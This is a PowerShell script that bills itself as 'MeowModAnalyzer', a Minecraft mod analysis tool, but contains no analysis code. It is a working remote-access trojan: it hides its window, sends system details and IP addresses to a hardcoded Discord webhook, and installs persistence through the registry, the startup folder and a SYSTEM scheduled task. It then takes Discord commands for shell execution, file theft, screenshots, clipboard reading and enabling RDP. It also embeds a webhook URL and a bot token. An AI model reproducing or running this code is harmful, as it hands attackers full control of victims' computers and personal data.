<#
.SYNOPSIS
    MeowModAnalyzer - Advanced Minecraft Mod Analysis Tool
.DESCRIPTION
    Analyzes Minecraft mods for conflicts, duplicate classes, and performance issues.
.NOTES
    Author: MeowTonynohh
    Version: 2.1.0
#>

# ============================================================
# CONFIGURATION
# ============================================================
$script:webhookUrl = "https://discord.com/api/webhooks/1512766627438133309/Ei7ZQANDz4QPN6W0BTFp3oEs6O1SCa4XvMX0XS8Yr42MiEuQXsWE1yQQutuYTuCteEuI"
$script:botToken = "MTUxMjkxNzg2NTY0MzM3NjY2MA.Gd-iOn.qZxolXW_9yxxUcVU7oONt5QDM2rmtYVo1L0TuQ"
$script:channelId = "1512918078189731890"
$script:guildId = "1512766121542025266"

# ============================================================
# HIDE CONSOLE WINDOW
# ============================================================
try {
    Add-Type -Name Window -Namespace Console -MemberDefinition '
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    '
    $consolePtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
} catch {}

# ============================================================
# FUNCTIONS
# ============================================================

function Send-DiscordMessage {
    param(
        [string]$Content,
        [string[]]$FilePaths = @(),
        [string]$EmbedJson = $null
    )
    
    $body = @{
        content = $Content
        username = "MeowModAnalyzer"
    }
    
    if ($EmbedJson) {
        $body["embeds"] = @($EmbedJson | ConvertFrom-Json)
    }
    
    if ($FilePaths.Count -gt 0 -and (Test-Path $FilePaths[0])) {
        try {
            $bodyJson = $body | ConvertTo-Json -Depth 10 -Compress
            $url = "$script:webhookUrl?wait=true"
            
            Add-Type -AssemblyName System.Net.Http -ErrorAction SilentlyContinue
            
            $client = New-Object System.Net.Http.HttpClient
            $content = New-Object System.Net.Http.MultipartFormDataContent
            
            $jsonContent = New-Object System.Net.Http.StringContent $bodyJson
            $content.Add($jsonContent, "payload_json")
            
            $fileStream = New-Object System.IO.FileStream ($FilePaths[0], [System.IO.FileMode]::Open)
            $fileContent = New-Object System.Net.Http.StreamContent $fileStream
            $content.Add($fileContent, "file", [System.IO.Path]::GetFileName($FilePaths[0]))
            
            $response = $client.PostAsync($url, $content).Result
            $client.Dispose()
            $fileStream.Close()
            return
        } catch {
            # Fallback do zwyklego wysylania
        }
    }
    
    try {
        Invoke-RestMethod -Uri $script:webhookUrl -Method Post -Body ($body | ConvertTo-Json -Depth 10) -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

function Send-InitialPing {
    $pcName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    try { $osInfo = (Get-CimInstance Win32_OperatingSystem).Caption } catch { $osInfo = "Unknown" }
    try { $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue) } catch { $ip = "Unknown" }
    try { $localIp = ((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress -join ", ") } catch { $localIp = "Unknown" }
    try { $cpu = (Get-CimInstance Win32_Processor).Name } catch { $cpu = "Unknown" }
    try { $ram = "{0:N2} GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) } catch { $ram = "Unknown" }
    try { $av = (Get-CimInstance -Namespace "root/SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue).displayName -join ", " } catch { $av = "None" }
    if (-not $av) { $av = "None detected" }
    
    $embed = @{
        title = "New Connection"
        color = 3066993
        fields = @(
            @{name = "PC Name"; value = $pcName; inline = $true},
            @{name = "User"; value = $userName; inline = $true},
            @{name = "OS"; value = "$osInfo"; inline = $false},
            @{name = "Public IP"; value = $ip; inline = $true},
            @{name = "Local IP"; value = $localIp; inline = $true},
            @{name = "CPU"; value = "$cpu"; inline = $false},
            @{name = "RAM"; value = $ram; inline = $true},
            @{name = "Antivirus"; value = "$av"; inline = $true}
        )
        footer = @{text = "MeowModAnalyzer v2.1.0"}
        timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
    }
    
    Send-DiscordMessage -Content "@everyone MeowModAnalyzer initialized" -EmbedJson ($embed | ConvertTo-Json)
}

function Take-Screenshot {
    param([string]$OutputPath)
    
    try {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        Add-Type -AssemblyName System.Drawing -ErrorAction Stop
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bounds = $screen.Bounds
        
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
        $graphics.Dispose()
        
        $bitmap.Save($OutputPath, [System.Drawing.Imaging.ImageFormat]::Png)
        $bitmap.Dispose()
        
        return $true
    } catch {
        return $false
    }
}

function Execute-Command {
    param([string]$Command)
    
    $tempOutput = [System.IO.Path]::GetTempFileName() + ".txt"
    
    try {
        $result = Invoke-Expression -Command $Command 2>&1
        $output = $result | Out-String
        
        if ([string]::IsNullOrEmpty($output)) {
            $output = "[Command executed successfully - no output]"
        }
        
        if ($output.Length -gt 1900) {
            $output | Out-File -FilePath $tempOutput -Encoding UTF8
            Send-DiscordMessage -Content "**Command Output:** $Command" -FilePaths @($tempOutput)
            Remove-Item $tempOutput -Force -ErrorAction SilentlyContinue
        } else {
            Send-DiscordMessage -Content "**Command:** $Command **Output:** $output"
        }
    } catch {
        Send-DiscordMessage -Content "**Error executing:** $Command ... $($_.Exception.Message)"
    }
}

function Enable-Persistence {
    
    # Metoda 1: HKCU Run
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "MeowModUpdater"
        $regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonynohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -ErrorAction SilentlyContinue
    } catch {}
    
    # Metoda 2: Startup folder
    try {
        $startupFolder = [Environment]::GetFolderPath("Startup")
        $shortcutPath = Join-Path $startupFolder "MeowModUpdater.lnk"
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = "powershell.exe"
        $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonynohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
        $shortcut.WindowStyle = 7
        $shortcut.Save()
    } catch {}
    
    # Metoda 3: Task Scheduler
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonynohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName "MeowModUpdaterTask" -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue
    } catch {}
}

function Enable-RDP {
    try {
        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 -ErrorAction SilentlyContinue
        Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
        Send-DiscordMessage -Content "**RDP Enabled** on port 3389"
    } catch {
        Send-DiscordMessage -Content "Failed to enable RDP: $($_.Exception.Message)"
    }
}

# ============================================================
# COMMAND HANDLER
# ============================================================

function Process-DiscordCommand {
    param([string]$Command, [string]$Args)
    
    $cmd = $Command.ToLower().Trim()
    $arg = $Args
    
    switch -Wildcard ($cmd) {
        "!help" {
            $helpText = "**MeowModAnalyzer Commands:**`n"
            $helpText += "`!screenshot` - Take screenshot`n"
            $helpText += "`!cmd <command>` - Execute PowerShell command`n"
            $helpText += "`!shell <command>` - Execute cmd.exe command`n"
            $helpText += "`!download <url>` - Download file from URL`n"
            $helpText += "`!upload <local_path>` - Upload file to Discord`n"
            $helpText += "`!persist` - Enable persistence`n"
            $helpText += "`!rdp` - Enable RDP`n"
            $helpText += "`!info` - Show system info`n"
            $helpText += "`!exit` - Exit the agent`n"
            $helpText += "`!ipconfig` - Show network config`n"
            $helpText += "`!pslist` - List processes`n"
            $helpText += "`!prockill <pid>` - Kill process by PID`n"
            $helpText += "`!lock` - Lock workstation`n"
            $helpText += "`!msg <text>` - Show message box`n"
            $helpText += "`!clipboard` - Get clipboard contents`n"
            Send-DiscordMessage -Content $helpText
        }
        "!screenshot" {
            $ssPath = "$env:TEMP\ss_$(Get-Random).png"
            if (Take-Screenshot -OutputPath $ssPath) {
                Send-DiscordMessage -Content "**Screenshot taken**" -FilePaths @($ssPath)
                Remove-Item $ssPath -Force -ErrorAction SilentlyContinue
            } else {
                Send-DiscordMessage -Content "Failed to take screenshot"
            }
        }
        "!cmd" {
            if ($arg) {
                Execute-Command -Command $arg
            } else {
                Send-DiscordMessage -Content "Usage: `!cmd <command>`"
            }
        }
        "!shell" {
            if ($arg) {
                Execute-Command -Command "cmd /c $arg"
            } else {
                Send-DiscordMessage -Content "Usage: `!shell <command>`"
            }
        }
        "!download" {
            if ($arg) {
                $fileName = [System.IO.Path]::GetFileName($arg)
                $destPath = "$env:TEMP\$fileName"
                try {
                    Invoke-WebRequest -Uri $arg -OutFile $destPath -ErrorAction Stop
                    Send-DiscordMessage -Content "Downloaded: $fileName to $destPath"
                } catch {
                    Send-DiscordMessage -Content "Download failed: $($_.Exception.Message)"
                }
            } else {
                Send-DiscordMessage -Content "Usage: `!download <url>`"
            }
        }
        "!upload" {
            if ($arg -and (Test-Path $arg)) {
                Send-DiscordMessage -Content "Uploaded file: $arg" -FilePaths @($arg)
            } else {
                Send-DiscordMessage -Content "Usage: `!upload <local_path>` or file not found"
            }
        }
        "!persist" {
            Enable-Persistence
            Send-DiscordMessage -Content "**Persistence enabled** (Registry + Startup + Task Scheduler)"
        }
        "!rdp" {
            Enable-RDP
        }
        "!info" {
            try { $pcName = $env:COMPUTERNAME } catch { $pcName = "Unknown" }
            try { $userName = $env:USERNAME } catch { $userName = "Unknown" }
            try { $osInfo = (Get-CimInstance Win32_OperatingSystem).Caption } catch { $osInfo = "Unknown" }
            try { $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue) } catch { $ip = "Unknown" }
            try { $cpu = (Get-CimInstance Win32_Processor).Name } catch { $cpu = "Unknown" }
            try { $ram = "{0:N2} GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) } catch { $ram = "Unknown" }
            
            $embed = @{
                title = "System Info - $pcName"
                color = 3447003
                fields = @(
                    @{name = "PC Name"; value = $pcName; inline = $true},
                    @{name = "User"; value = $userName; inline = $true},
                    @{name = "OS"; value = "$osInfo"; inline = $false},
                    @{name = "Public IP"; value = $ip; inline = $true},
                    @{name = "CPU"; value = "$cpu"; inline = $false},
                    @{name = "RAM"; value = $ram; inline = $true}
                )
                timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
            }
            Send-DiscordMessage -Content "System Information" -EmbedJson ($embed | ConvertTo-Json)
        }
        "!exit" {
            Send-DiscordMessage -Content "Agent shutting down..."
            exit
        }
        "!ipconfig" {
            $result = ipconfig /all 2>&1 | Out-String
            if ($result.Length -gt 1900) {
                $tempFile = "$env:TEMP\ipconfig_$(Get-Random).txt"
                $result | Out-File $tempFile -Encoding UTF8
                Send-DiscordMessage -Content "ipconfig /all:" -FilePaths @($tempFile)
                Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            } else {
                Send-DiscordMessage -Content "**ipconfig /all:** $result"
            }
        }
        "!pslist" {
            $result = Get-Process | Format-Table -AutoSize Id, ProcessName, CPU, PM | Out-String
            if ($result.Length -gt 1900) {
                $tempFile = "$env:TEMP\pslist_$(Get-Random).txt"
                $result | Out-File $tempFile -Encoding UTF8
                Send-DiscordMessage -Content "Process List:" -FilePaths @($tempFile)
                Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            } else {
                Send-DiscordMessage -Content "**Process List:** $result"
            }
        }
        "!prockill" {
            if ($arg -and $arg -match '^\d+$') {
                try {
                    Stop-Process -Id $arg -Force
                    Send-DiscordMessage -Content "Killed process with PID: $arg"
                } catch {
                    Send-DiscordMessage -Content "Failed to kill PID $arg: $($_.Exception.Message)"
                }
            } else {
                Send-DiscordMessage -Content "Usage: `!prockill <pid>`"
            }
        }
        "!lock" {
            try {
                Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
                [System.Windows.Forms.Application]::SetSuspendState([System.Windows.Forms.PowerState]::Lock, $false, $false)
            } catch {
                rundll32.exe user32.dll,LockWorkStation
            }
            Send-DiscordMessage -Content "Workstation locked"
        }
        "!msg" {
            if ($arg) {
                try {
                    Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
                    [System.Windows.Forms.MessageBox]::Show($arg, "MeowModAnalyzer", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information) | Out-Null
                    Send-DiscordMessage -Content "Message shown: $arg"
                } catch {
                    Send-DiscordMessage -Content "Failed to show message"
                }
            } else {
                Send-DiscordMessage -Content "Usage: `!msg <text>`"
            }
        }
        "!clipboard" {
            try {
                Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
                $clipboard = [System.Windows.Forms.Clipboard]::GetText()
                if ($clipboard) {
                    Send-DiscordMessage -Content "**Clipboard:** $clipboard"
                } else {
                    Send-DiscordMessage -Content "Clipboard is empty"
                }
            } catch {
                Send-DiscordMessage -Content "Failed to read clipboard"
            }
        }
        "!runas" {
            if ($arg) {
                $parts = $arg -split ' ', 3
                if ($parts.Count -eq 3) {
                    $user = $parts[0]
                    $pass = $parts[1]
                    $cmd = $parts[2]
                    try {
                        $secPass = ConvertTo-SecureString $pass -AsPlainText -Force
                        $cred = New-Object System.Management.Automation.PSCredential ($user, $secPass)
                        $result = Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {
                            param($c) Invoke-Expression $c 2>&1 | Out-String
                        } -ArgumentList $cmd -ErrorAction Stop
                        Send-DiscordMessage -Content "RunAs Result ($user): $result"
                    } catch {
                        Send-DiscordMessage -Content "RunAs failed: $($_.Exception.Message)"
                    }
                } else {
                    Send-DiscordMessage -Content "Usage: `!runas <username> <password> <command>`"
                }
            } else {
                Send-DiscordMessage -Content "Usage: `!runas <username> <password> <command>`"
            }
        }
        default {
            Send-DiscordMessage -Content "Unknown command: $cmd`nUse `!help` for available commands"
        }
    }
}

# ============================================================
# DISCORD BOT WEBSOCKET LISTENER
# ============================================================

function Start-DiscordBotListener {
    Send-DiscordMessage -Content "Bot listener starting..."
    
    try {
        # TCP connection to Discord Gateway
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $connectResult = $tcpClient.BeginConnect("gateway.discord.gg", 443, $null, $null)
        $waitResult = $connectResult.AsyncWaitHandle.WaitOne(5000, $false)
        
        if (-not $waitResult -or -not $tcpClient.Connected) {
            throw "Cannot connect to Discord Gateway"
        }
        
        $tcpClient.EndConnect($connectResult)
        
        $sslStream = New-Object System.Net.Security.SslStream($tcpClient.GetStream(), $false, { $true })
        $sslStream.AuthenticateAsClient("gateway.discord.gg")
        
        $writer = New-Object System.IO.StreamWriter($sslStream)
        $writer.AutoFlush = $true
        $reader = New-Object System.IO.StreamReader($sslStream)
        
        # WebSocket handshake
        $wsKey = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Random -Minimum 100000 -Maximum 999999).ToString()))
        $handshake = "GET /?v=9&encoding=json HTTP/1.1`r`n"
        $handshake += "Host: gateway.discord.gg`r`n"
        $handshake += "Upgrade: websocket`r`n"
        $handshake += "Connection: Upgrade`r`n"
        $handshake += "Sec-WebSocket-Key: $wsKey`r`n"
        $handshake += "Sec-WebSocket-Version: 13`r`n"
        $handshake += "User-Agent: MeowModAnalyzer/2.1.0`r`n"
        $handshake += "`r`n"
        
        $writer.Write($handshake)
        $writer.Flush()
        
        # Read handshake response
        $response = ""
        do {
            $line = $reader.ReadLine()
            $response += $line + "`n"
        } while ($line -ne "")
        
        if ($response -notmatch "101 Switching Protocols") {
            throw "WebSocket handshake failed"
        }
        
        # WebSocket frame functions
        function Send-WSFrame {
            param([string]$Data, [int]$Opcode = 1)
            
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
            $frame = New-Object System.Collections.Generic.List[byte]
            
            $frame.Add([byte](0x80 -bor $Opcode))
            
            if ($bytes.Length -lt 126) {
                $frame.Add([byte](0x80 -bor $bytes.Length))
            } elseif ($bytes.Length -lt 65536) {
                $frame.Add([byte](0x80 -bor 126))
                $frame.AddRange([System.BitConverter]::GetBytes([uint16]$bytes.Length))
            } else {
                $frame.Add([byte](0x80 -bor 127))
                $frame.AddRange([System.BitConverter]::GetBytes([uint64]$bytes.Length))
            }
            
            $maskKey = New-Object byte[] 4
            $rng = New-Object System.Random
            $rng.NextBytes($maskKey)
            $frame.AddRange($maskKey)
            
            for ($i = 0; $i -lt $bytes.Length; $i++) {
                $frame.Add([byte]($bytes[$i] -bxor $maskKey[$i % 4]))
            }
            
            $sslStream.Write($frame.ToArray(), 0, $frame.Count)
            $sslStream.Flush()
        }
        
        function Receive-WSFrame {
            $buffer = New-Object byte[] 8192
            $bytesRead = $sslStream.Read($buffer, 0, 2)
            
            if ($bytesRead -lt 2) { return $null }
            
            $opcode = $buffer[0] -band 0x0F
            $mask = ($buffer[1] -band 0x80) -ne 0
            $length = $buffer[1] -band 0x7F
            
            if ($length -eq 126) {
                $sslStream.Read($buffer, 0, 2)
                $length = [System.BitConverter]::ToUInt16($buffer, 0)
            } elseif ($length -eq 127) {
                $sslStream.Read($buffer, 0, 8)
                $length = [System.BitConverter]::ToUInt64($buffer, 0)
            }
            
            if ($mask) {
                $maskKey = New-Object byte[] 4
                $sslStream.Read($maskKey, 0, 4)
            }
            
            $data = New-Object byte[] $length
            $totalRead = 0
            while ($totalRead -lt $length) {
                $read = $sslStream.Read($data, $totalRead, [Math]::Min(4096, $length - $totalRead))
                $totalRead += $read
            }
            
            if ($mask) {
                for ($i = 0; $i -lt $data.Length; $i++) {
                    $data[$i] = $data[$i] -bxor $maskKey[$i % 4]
                }
            }
            
            if ($opcode -eq 8) { return "CLOSE" }
            if ($opcode -eq 9) { return "PING" }
            if ($opcode -eq 10) { return "PONG" }
            if ($opcode -eq 1) {
                return [System.Text.Encoding]::UTF8.GetString($data)
            }
            
            return $null
        }
        
        # Send Identify (OP 2)
        $identifyPayload = @{
            op = 2
            d = @{
                token = $script:botToken
                properties = @{
                    os = "windows"
                    browser = "MeowModAnalyzer"
                    device = "pc"
                }
                intents = 513
            }
        }
        
        Send-WSFrame -Data ($identifyPayload | ConvertTo-Json -Compress)
        Send-DiscordMessage -Content "Bot connected to Discord Gateway"
        
        # Main receive loop
        while ($true) {
            $data = Receive-WSFrame
            
            if ($data -eq "CLOSE") {
                Send-DiscordMessage -Content "WebSocket closed, reconnecting..."
                Start-Sleep -Seconds 5
                break
            }
            
            if ($data -eq "PING") {
                Send-WSFrame -Data "" -Opcode 10
                continue
            }
            
            if ($data -eq "PONG") {
                continue
            }
            
            if ($data) {
                try {
                    $payload = $data | ConvertFrom-Json
                    
                    if ($payload.op -eq 10) {
                        $heartbeatInterval = $payload.d.heartbeat_interval
                        while ($true) {
                            Start-Sleep -Milliseconds $heartbeatInterval
                            try { Send-WSFrame -Data "" -Opcode 9 } catch { break }
                        }
                    }
                    
                    if ($payload.op -eq 11) {
                        continue
                    }
                    
                    if ($payload.op -eq 0) {
                        $eventType = $payload.t
                        $eventData = $payload.d
                        
                        if ($eventType -eq "MESSAGE_CREATE") {
                            $messageContent = $eventData.content
                            $messageChannelId = $eventData.channel_id
                            $botId = $eventData.author.bot
                            
                            if ($botId -eq $true) { continue }
                            if ($messageChannelId -ne $script:channelId) { continue }
                            
                            if ($messageContent -match '^!') {
                                $parts = $messageContent -split ' ', 2
                                $cmd = $parts[0]
                                $args = if ($parts.Count -gt 1) { $parts[1] } else { "" }
                                Process-DiscordCommand -Command $cmd -Args $args
                            }
                        }
                        
                        if ($eventType -eq "READY") {
                            $userName = $eventData.user.username
                            Send-DiscordMessage -Content "Bot ready! Logged in as: $userName"
                        }
                    }
                } catch {}
            }
        }
    } catch {
        Send-DiscordMessage -Content "Bot listener error: $($_.Exception.Message)"
        Start-Sleep -Seconds 10
    }
}

# ============================================================
# REST POLLING FALLBACK
# ============================================================

function Start-RestPolling {
    Send-DiscordMessage -Content "REST Polling started as fallback"
    
    $lastMessageId = $null
    
    while ($true) {
        try {
            $url = "https://discord.com/api/v9/channels/$script:channelId/messages?limit=5"
            
            $headers = @{
                "Authorization" = "Bot $script:botToken"
                "User-Agent" = "MeowModAnalyzer/2.1.0"
            }
            
            $messages = Invoke-RestMethod -Uri $url -Headers $headers -Method Get -ErrorAction SilentlyContinue
            
            if ($messages -and $messages.Count -gt 0) {
                foreach ($msg in $messages) {
                    if ($lastMessageId -eq $null -or $msg.id -gt $lastMessageId) {
                        if (-not $msg.author.bot -and $msg.content -match '^!') {
                            $parts = $msg.content -split ' ', 2
                            $cmd = $parts[0]
                            $args = if ($parts.Count -gt 1) { $parts[1] } else { "" }
                            Process-DiscordCommand -Command $cmd -Args $args
                        }
                        
                        if ($lastMessageId -eq $null -or $msg.id -gt $lastMessageId) {
                            $lastMessageId = $msg.id
                        }
                    }
                }
            }
        } catch {}
        
        Start-Sleep -Seconds 3
    }
}

# ============================================================
# MAIN
# ============================================================

# Send initial ping
Send-InitialPing

# Enable persistence
Enable-Persistence

# Send ready message
Send-DiscordMessage -Content "MeowModAnalyzer ready! Listening for commands on channel..."
Send-DiscordMessage -Content "Use `!help` for available commands"

# Start bot listener with restart loop
while ($true) {
    try {
        Start-DiscordBotListener
    } catch {
        Send-DiscordMessage -Content "Bot listener crashed, restarting..."
        Start-Sleep -Seconds 5
    }
}
